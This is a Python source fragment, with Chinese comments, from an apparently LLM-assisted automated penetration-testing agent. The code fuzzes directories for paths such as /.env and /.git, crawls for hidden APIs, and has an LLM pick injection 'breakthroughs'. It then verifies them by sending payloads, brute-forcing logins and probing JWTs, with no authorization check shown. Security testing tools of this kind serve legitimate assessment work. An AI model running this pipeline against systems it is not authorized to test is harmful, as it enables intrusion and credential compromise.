                    target_val = f"{host_info.get('host','')}:{host_info.get('port','')}"
                inventory.add(AssetItem(
                    type="port",
                    value=target_val,
                    source="traffic_scan",
                    metadata=host_info,
                    confidence=0.9,
                    tags=[host_info.get("service", "unknown")],
                ))
        except Exception:
            pass

        # 4. CrawlerEngine — 递归爬虫发现隐藏接口
        try:
            from .crawler import CrawlerEngine
            from pathlib import Path

            dict_paths = []
            payload_dir = Path(__file__).parent.parent / "payloads" / "discovery"
            for fname in ["dirs_quick.txt", "swagger_docs.txt", "api_endpoints.txt"]:
                fpath = payload_dir / fname
                if fpath.exists():
                    with open(fpath, encoding="utf-8", errors="ignore") as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith("#") and not line.startswith("//"):
                                if not line.startswith("/"):
                                    line = "/" + line
                                dict_paths.append(line)
            dict_paths = list(dict.fromkeys(dict_paths)) if dict_paths else []

            import requests as _crawler_req
            _cs = _crawler_req.Session()
            _cs.verify = False
            _cs.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            if self.proxy_manager:
                try:
                    _p = self.proxy_manager.get_proxy()
                    if _p:
                        _cs.proxies = {"http": _p, "https": _p}
                except Exception:
                    pass

            cer = CrawlerEngine(
                base_url=f"https://{target}",
                session=_cs,
                llm_client=None,
                max_depth=2,
                max_urls=150,
                dict_paths=dict_paths,
                concurrency=10,
                request_delay=0.15,
                proxy_manager=self.proxy_manager,
            )
            try:
                import asyncio as _crawler_aio
                crawler_inv = await _crawler_aio.wait_for(cer.run(), timeout=120)
                for item in crawler_inv.items:
                    inventory.add(item)
            except _crawler_aio.TimeoutError:
                pass
            except Exception:
                pass
            finally:
                try:
                    _cs.close()
                except Exception:
                    pass
        except Exception:
            pass

        # 5. 面板检测
        try:
            panel = self._action_detect_panel({"url": f"https://{target}"})
            for p in (panel.get("data", {}) or {}).get("panels", []):
                inventory.add(AssetItem(
                    type="url", value=p.get("login_url", ""),
                    source="detect_panel", metadata=p,
                    confidence=0.9, tags=["panel", p.get("panel_type", "")],
                ))
        except Exception:
            pass

        self._inventory = inventory
        self._phase = 1
        return {
            "ok": True,
            "summary": f"Phase ① 完成: {len(inventory)} 项资产",
            "inventory_size": len(inventory),
        }

    def _action_dir_fuzz(self, params: Dict) -> Dict:
        """
        目录枚举 — 仅发正常 GET, 不带任何 payload。

        Args:
            url: 目标根 URL
            wordlist: (可选) 自定义字典路径
            max_paths: 最大路径数, 默认 200
            concurrency: 并发数, 默认 10
            delay: 请求间隔秒数, 默认 0.3
        """
        url = params.get("url", "")
        if not url:
            return {"ok": False, "error": "缺少 url"}

        max_paths = params.get("max_paths", 200)
        delay = params.get("delay", 0.3)

        # 内置常见路径字典
        default_paths = [
            "/admin", "/login", "/wp-admin", "/wp-login.php",
            "/api", "/api/v1", "/swagger", "/docs", "/graphql",
            "/.git", "/.env", "/.htaccess", "/config", "/backup",
            "/phpmyadmin", "/phpinfo.php", "/test", "/debug",
            "/robots.txt", "/sitemap.xml", "/.well-known",
            "/uploads", "/files", "/static", "/assets",
            "/js", "/css", "/images", "/img",
            "/favicon.ico", "/index.html", "/index.php",
            "/console", "/shell", "/terminal", "/cmd",
            "/manager", "/panel", "/dashboard", "/control",
            "/cgi-bin", "/scripts", "/tmp", "/temp",
            "/logs", "/log", "/var", "/etc",
            "/health", "/status", "/metrics", "/info",
            "/actuator", "/actuator/health", "/actuator/env",
            "/v1", "/v2", "/v3", "/version", "/versions",
            "/user", "/users", "/account", "/accounts",
            "/order", "/orders", "/cart", "/checkout",
            "/search", "/query", "/find", "/list",
            "/upload", "/download", "/export", "/import",
            "/register", "/signup", "/signin", "/logout",
            "/reset", "/forgot", "/password", "/token",
            "/auth", "/oauth", "/sso", "/callback",
            "/webhook", "/webhooks", "/notify", "/notification",
            "/private", "/internal", "/secret", "/hidden",
            "/dev", "/test", "/stage", "/staging", "/prod",
            "/old", "/new", "/bak", "/orig", "/copy",
            "/.svn", "/.hg", "/.bzr", "/CVS",
            "/package.json", "/composer.json", "/Gemfile",
            "/Dockerfile", "/docker-compose.yml",
            "/README", "/README.md", "/CHANGELOG",
            "/LICENSE", "/NOTICE", "/AUTHORS",
            "/Makefile", "/build", "/dist", "/target",
            "/node_modules", "/vendor", "/bower_components",
        ][:max_paths]

        session = self._get_http_session()
        found = []

        try:
            for path in default_paths:
                try:
                    full_url = url.rstrip("/") + path
                    resp = session.get(full_url, timeout=8, allow_redirects=False)
                    status = resp.status_code
                    length = len(resp.content)

                    # 200/301/302/403 = 路径存在
                    if status in (200, 301, 302, 403):
                        found.append({
                            "url": full_url,
                            "status": status,
                            "length": length,
                            "path": path,
                        })

                    if delay:
                        import time as _t
                        _t.sleep(delay)
                except Exception:
                    continue
        finally:
            session.close()

        return {
            "ok": True,
            "summary": f"url={url} 发现 {len(found)} 个路径",
            "data": {"found": found, "total_checked": len(default_paths)},
        }

    # --- Phase ②: 资产转流量 ---

    async def _trafficify_assets(self, inventory=None) -> Dict:
        """
        把 AssetInventory 中的所有资产批量转流量,
        只发正常请求, 结果写入 TrafficJournal.
        V4: async 方法, 在单一长效 loop 内运行.
        """
        inv = inventory or getattr(self, "_inventory", None)
        if not inv:
            return {"ok": False, "error": "无资产清单"}

        journal = self._ensure_journal()
        count_before = len(journal._entries)

        for item in inv.items:
            try:
                if item.type == "url":
                    await self._trafficify_url(item, journal)
                elif item.type == "subdomain":
                    await self._trafficify_subdomain(item, journal)
                elif item.type == "port":
                    await self._trafficify_port(item, journal)
                elif item.type == "directory":
                    await self._trafficify_url(item, journal)
                elif item.type == "credential":
                    # Phase ② 不验证凭据, 仅记录 (打码)
                    journal.record_raw(
                        protocol="credential", target=item.value,
                        summary=f"凭证: {item.metadata.get('username', '?')}:***",
                        direction="none", source="trafficify",
                    )
            except Exception:
                continue

        entries_added = len(journal._entries) - count_before
        self._trafficified = True
        return {
            "ok": True,
            "entries_added": entries_added,
            "journal_summary": journal.llm_summary(last_n=entries_added or 50),
        }

    async def _trafficify_url(self, item, journal):
        """对 URL 发正常 GET, 不加任何 payload, 走共享 engine"""
        async def _do(eng):
            try:
                client = eng._adapters["http"]._burp._client
            except (KeyError, AttributeError):
                return
            if client is None:
                return
            try:
                resp = await client.get(item.value, timeout=10, follow_redirects=False)
                body_hint = resp.text[:2000] if resp.text else ""
                journal.record_http(
                    method="GET", url=item.value,
                    status=resp.status_code,
                    headers=dict(resp.headers),
                    length=len(resp.content),
                    body=body_hint,
                    source="trafficify",
                )
            except Exception as e:
                journal.record_raw(
                    protocol="http", target=item.value,
                    summary=f"GET -> error: {str(e)[:60]}",
                    direction="request", source="trafficify",
                    error=str(e)[:80],
                )

        await self._run_with_engine(_do)

    async def _trafficify_subdomain(self, item, journal):
        """子域名 → 默认协议探测 + 正常 GET"""
        host = item.value
        urls_to_try = []
        if item.metadata.get("protocol"):
            urls_to_try.append(f"{item.metadata['protocol']}://{host}")
        elif item.metadata.get("port") == 443:
            urls_to_try.append(f"https://{host}")
        else:
            urls_to_try.append(f"http://{host}")
            urls_to_try.append(f"https://{host}")

        async def _do(eng):
            try:
                client = eng._adapters["http"]._burp._client
            except (KeyError, AttributeError):
                return
            if client is None:
                return
            for url in urls_to_try:
                try:
                    resp = await client.get(url, timeout=8, follow_redirects=False)
                    journal.record_http(
                        method="GET", url=url, status=resp.status_code,
                        headers=dict(resp.headers),
                        length=len(resp.content),
                        body=resp.text[:2000] if resp.text else "",
                        source="trafficify",
                    )
                except Exception:
                    continue

        await self._run_with_engine(_do)

    async def _trafficify_port(self, item, journal):
        """端口 → 根据服务类型做标准 banner grab, 不发恶意 payload"""
        host = item.metadata.get("host", "")
        port = item.metadata.get("port", item.value.split(":")[-1] if ":" in item.value else "")
        service = item.metadata.get("service", "").lower()

        if service in ("http", "https") and host:
            return  # HTTP 端口已通过 url type 覆盖

        async def _do(eng):
            target = f"{host}:{port}" if host else item.value
            result = await eng.smart_probe(target, timeout=8)
            if result and result.ok:
                banner = getattr(result, "banner", "") or getattr(result, "text", "") or ""
                journal.record_raw(
                    protocol=service or "tcp",
                    target=target,
                    summary=f"banner: {banner[:100]}",
                    direction="response", source="trafficify",
                )

        try:
            await self._run_with_engine(_do)
        except Exception as e:
            journal.record_raw(
                protocol=service or "tcp",
                target=f"{host}:{port}",
                summary=f"probe error: {str(e)[:60]}",
                direction="request", source="trafficify",
                error=str(e)[:80],
            )

    # --- Phase ③: LLM 流量分析 ---

    def _llm_analyze_journal(self, target: str) -> Dict:
        """
        把当前 TrafficJournal 发给 LLM 分析,
        返回突破口列表（每个突破口含 payload_category）。
        """
        journal = self._ensure_journal()
        if len(journal._entries) < 3:
            return {"ok": False, "error": "流量不足 (< 3 条), 先补充流量"}

        from .traffic.experience_rules import TrafficRuleEngine

        journal_text = journal.llm_summary(last_n=100)

        # 附加规则引擎分析结果（作为补充信号，非主流）
        tre = TrafficRuleEngine()
        rule_hits = []  # (RuleHit, url) 元组, 保留 url 供 fallback 用
        for entry in journal._entries[-100:]:
            entry_url = getattr(entry, "target", "")
            ctx = {
                "response": {
                    "status": getattr(entry, "status", 0),
                    "body": getattr(entry, "summary", ""),
                    "headers": {},
                    "url": entry_url,
                    "banner": getattr(entry, "summary", ""),
                },
                "request": {"headers": {}},
                "url": entry_url,
            }
            for h in tre.apply(ctx):
                rule_hits.append((h, entry_url))
        if rule_hits:
            journal_text += "\n### TrafficRuleEngine 自动命中:\n"
            for h, _ in rule_hits[:10]:
                journal_text += f"- [{h.severity}] {h.finding_type}: {h.evidence[:80]}\n"

        # 用 TRAFFIC_ANALYZER 提示词 (从 prompts 模块动态加载)
        try:
            from .prompts import PromptTemplates
            prompt = PromptTemplates.TRAFFIC_ANALYZER.format(
                target=target, journal=journal_text,
            )
        except AttributeError:
            # 如果 TRAFFIC_ANALYZER 还没加到 prompts.py, 用内联版本
            prompt = self._build_traffic_analyzer_prompt(target, journal_text)

        try:
            response = self.llm.ask(prompt)
            # 解析 LLM 输出的 JSON 突破口列表
            import json
            import re
            m = re.search(r'\[.*\]', response, re.DOTALL)
            breakthroughs = json.loads(m.group(0)) if m else []
            for bt in breakthroughs:
                bt["_source"] = "llm_journal_analysis"
                self._add_to_context("breakthrough", bt.get("target", "?"), bt)
            return {
                "ok": True,
                "breakthroughs": breakthroughs,
                "summary": f"LLM 找到 {len(breakthroughs)} 个突破口",
            }
        except Exception as e:
            # LLM 不可用时, 用规则引擎结果作为 fallback 突破口
            if rule_hits:
                from .payloads.by_breakthrough import get_vuln_types
                bt_seen = set()
                breakthroughs = []
                for h, hit_url in rule_hits:
                    bt_key = (h.finding_type, h.evidence[:60])
                    if bt_key in bt_seen:
                        continue
                    bt_seen.add(bt_key)
                    # 映射 finding_type → payload_category
                    cat_map = {
                        "redis_unauth": "unauth_bypass",
                        "docker_unauth": "unauth_bypass",
                        "mysql_unauth": "unauth_bypass",
                        "ssh_weak": "auth_brute",
                        "smb_unauth": "unauth_bypass",
                        "info_leak": "api_discovery",
                        "sqli_error": "sqli_reflection",
                        "xss_reflected": "xss_reflected",
                        "ssti": "ssti",
                        "lfi": "lfi",
                        "cmdi": "cmdi",
                        "ssrf": "ssrf",
                        "path_traversal": "path_traversal",
                        "cors_misconfig": "cors_misconfig",
                        "open_redirect": "redirect_open",
                        "jwt_weak": "jwt_weak_secret",
                        "panel_exposed": "auth_brute",
                    }
                    pc = cat_map.get(h.finding_type, "")
                    if not pc or not get_vuln_types(pc):
                        continue  # 跳过没有对应 payload 的
                    breakthroughs.append({
                        "type": h.finding_type,
                        "target": hit_url or target,
                        "evidence": h.evidence[:120],
                        "confidence": "高" if h.severity in ("critical", "high") else "中",
                        "payload_category": pc,
                        "payload_args": {"param": "id", "base_value": "1", "method": "GET"},
                        "_source": "rule_engine_fallback",
                    })
                for bt in breakthroughs:
                    self._add_to_context("breakthrough", bt.get("target", "?"), bt)
                return {
                    "ok": True,
                    "breakthroughs": breakthroughs,
                    "summary": f"规则引擎 fallback: {len(breakthroughs)} 个突破口 (LLM 不可用: {str(e)[:60]})",
                }
            return {"ok": False, "error": str(e)[:200]}

    def _build_traffic_analyzer_prompt(self, target: str, journal_text: str) -> str:
        """内联 TRAFFIC_ANALYZER 提示词 (当 prompts.py 未定义时用)"""
        return f"""# 流量包分析 — 你面前是一份完整的渗透测试流量日志

## 重要约束
这份流量日志是 **干净的**。所有请求都是正常流量，没有混入任何攻击 payload。

## 你的任务
这是一份针对 {target} 的完整流量日志（TrafficJournal）。
你的工作是：**读流量，找突破口，并为每个突破口指定 payload 分类**。

## 分析框架
### Step 1: 流量概览 — 系统是什么? 暴露了哪些服务? 认证机制?
### Step 2: 逐条深度分析 — 每条流量暴露了什么?
### Step 3: 模式发现 — IDOR/注入点/SSRF/会话等模式
### Step 4: 突破口生成

输出 JSON 数组, 每个突破口:
```json
[{{"type":"突破口类型","target":"目标URL","evidence":"流量证据","confidence":"高/中/低","payload_category":"idor|sqli_reflection|sqli_blind|xss_reflected|xss_stored|ssrf|lfi|path_traversal|cmdi|ssti|jwt_none|jwt_weak_secret|upload_bypass|unauth_bypass|auth_brute|cors_misconfig|redirect_open|api_discovery|graphql_introspect|no_auth_check","payload_args":{{"param":"id","base_value":"1","method":"GET"}}}}]
```

## 流量日志
{journal_text}

基于上述分析，列出你找到的突破口："""

    # --- Phase ④: 精准验证 ---

    async def _verify_breakthrough(self, bt: Dict) -> Dict:
        """
        根据 LLM 输出的一个突破口, 精准发 payload 验证。
        复用 MultiChannelInjector, 不另写检测器。
        """
        target = bt.get("target", "")
        category = bt.get("payload_category", "")
        args = bt.get("payload_args", {})

        if not target or not category:
            return {"ok": False, "error": "突破口缺 target 或 payload_category"}

        from .payloads.by_breakthrough import get_vuln_types

        vuln_types = get_vuln_types(category)
        if not vuln_types:
            return await self._verify_special(target, category, args)

        # 用 _get_http_session() 拿同步 session
        session = self._get_http_session()

        try:
            from .traffic.injector import MultiChannelInjector
            injector = MultiChannelInjector(session, timeout=10, delay=0.3,
                                            journal=self._ensure_journal())
            report = injector.scan_all(target, vuln_types=vuln_types)

            findings = [f.to_dict() for f in report.findings]
            confirmed = any(f.get("confidence") == "confirmed" for f in findings)

            self._add_to_context("verify_result", target, {
                "breakthrough_type": bt.get("type"),
                "category": category,
                "confirmed": confirmed,
                "findings": findings,
            })

            return {
                "ok": True,
                "target": target,
                "category": category,
                "confirmed": confirmed,
                "findings": findings,
            }
        except Exception as e:
            return {"ok": False, "error": str(e)[:200]}
        finally:
            session.close()

    async def _verify_special(self, target: str, category: str, args: Dict) -> Dict:
        """
        处理 injector 不覆盖的类别:
        - upload_bypass: 调 _action_attack_checklist
        - auth_brute: 调 _action_login_brute
        - jwt_none/jwt_weak_secret: 调 _action_jwt_analyze
        - unauth_bypass/no_auth_check: 调 _action_check_unauth
        - xss_stored: 走 injector 的 xss 反射检测 (存储型检测待实现)
        - api_discovery: 回退到 Phase ① 补点
        """
        if category == "auth_brute":
            r = self._action_login_brute({"url": target})
            # 补 confirmed 字段: login_brute 的成功凭据在 data.successful
            r["confirmed"] = bool((r.get("data", {}) or {}).get("successful"))
            return r
        if category == "upload_bypass":
            r = self._action_attack_checklist({"url": target})
            r["confirmed"] = r.get("ok", False) and bool(r.get("data", {}).get("findings"))
            return r
        if category in ("jwt_none", "jwt_weak_secret"):
            r = self._action_jwt_analyze({"url": target})
            r["confirmed"] = r.get("ok", False) and bool(r.get("data", {}).get("vulnerable"))
            return r
        if category in ("unauth_bypass", "no_auth_check"):
            r = await self._action_check_unauth({"url": target})
            r["confirmed"] = r.get("ok", False) and bool(r.get("data", {}).get("unauth_endpoints"))
            return r
        if category == "api_discovery":
            return {"ok": False, "error": "需要回退 Phase ① 补充 API 端点探测",
                    "needs_rerun": True}
        # cors / redirect / graphql / xss_stored: 简单专用检测
        return {"ok": True, "target": target, "category": category,
                "confirmed": False, "note": "专用检测待实现"}


def check_llm_status() -> Dict:
    """检查 LLM 配置状态"""
    llm = LLMClient()
    
    if llm.is_available:
        current = llm._current_config
        return {
            "ok": True,
            "provider": current.provider,
            "model": current.model,
            "configs": len(llm._configs),
            "message": f"LLM 已配置 (共 {len(llm._configs)} 个配置)，Agent 模式可用"
        }
    else:
        return {
            "ok": False,
            "message": "LLM 未配置，请设置环境变量 OPENAI_API_KEY 或 ANTHROPIC_API_KEY"
        }